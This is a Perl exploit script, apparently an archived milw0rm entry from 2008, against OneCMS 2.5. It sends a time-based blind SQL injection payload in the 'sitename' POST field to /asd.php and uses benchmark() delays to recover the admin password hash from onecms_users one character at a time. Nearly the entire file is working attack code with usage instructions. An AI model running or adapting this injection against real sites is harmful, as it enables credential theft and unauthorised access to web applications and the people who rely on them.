#!/usr/bin/perl
# OneCMS 2.5 Remote Blind SQL Injection Exploit
# Author : Cod3rZ
# Site : http://cod3rz.helloweb.eu
# Site : http://devilsnight.altervista.org
# Usage : perl oc.pl site
# There's many other bugs, find them yourself

use LWP::UserAgent;
use HTTP::Request::Common;
use Time::HiRes;

$ua = LWP::UserAgent->new;

$site = $ARGV[0];

if(!$site) { &usage; }
@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);

sub usage {
 print " Usage: perl oc.pl site \n";
 print " Ex.: perl oc.pl http://127.0.0.1 \n";
}
sub request {
 $var = $_[0];
 $start = Time::HiRes::time();
 $response = $ua->request(POST $site.'/asd.php',[ sitename => $var, ]);
 $response->is_success() || print("$!\n");
 $end = Time::HiRes::time();
 $time = $end - $start;
 return $time
}
sub refresh{
 system("cls");
 print " -------------------------------------------------\n";
 print " OneCMS 2.5 Remote Blind Sql Injection Exploit    \n";
 print " Powered by Cod3rZ                                \n";
 print " http://cod3rz.helloweb.eu                        \n";
 print " -------------------------------------------------\n";
 print " Please Wait..                                    \n";
 print " Hash : " . $_[3] . "                             \n";
 print " -------------------------------------------------\n";
}
for ($i = 1; $i < 33; $i++)
 {
  for ($j = 0; $j < 16; $j++)
   {
   $var = "lol'+(SELECT IF ((ASCII( SUBSTRING( `password` , ".$i.", 1 ) ) =".$array[$j]." ) , benchmark( 200000000, CHAR( 0 )),0) FROM onecms_users WHERE `id` =1)+ '', '', '', '', '', '', '', '', '', '')/*";
 $time = request($var);
 refresh($host,$timedefault,$j,$hash,$time,$i);
if($time > 4)
{
 $time = request($var);
 refresh($host,$timedefault,$j,$hash,$time,$i);
 $hash .= chr($array[$j]);
 refresh($host,$timedefault,$j,$hash,$time,$i);
 $j=200;
}}

if($i == 1 && !$hash)
{
 print " Failed                                           \n";
 print " -------------------------------------------------\n";
 die();
}
if($i == 32) {
 print " Exploit Terminated                               \n";
 print " -------------------------------------------------\n ";
 system('pause');
}}

# milw0rm.com [2008-05-07]
